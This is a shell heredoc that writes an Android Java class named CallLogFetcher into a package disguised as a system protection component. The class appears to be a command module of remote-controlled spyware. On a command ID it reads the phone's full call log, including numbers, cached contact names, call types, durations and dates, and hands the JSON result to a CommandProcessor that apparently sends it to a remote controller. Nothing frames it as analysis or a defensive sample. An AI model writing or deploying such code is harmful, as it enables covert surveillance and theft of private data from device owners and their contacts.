cat > app/src/main/java/com/android/system/protection/commands/CallLogFetcher.java << 'EOF'
package com.android.system.protection.commands;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallLogFetcher {

    public static void fetch(Context context, JSONObject params, String commandId) {
        JSONArray callsArray = new JSONArray();
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                try {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                    call.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    call.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    call.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                    callsArray.put(call);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }

        JSONObject result = new JSONObject();
        try {
            result.put("calls", callsArray);
        } catch (Exception e) {}
        CommandProcessor.sendResult(context, commandId, result);
    }
}
EOF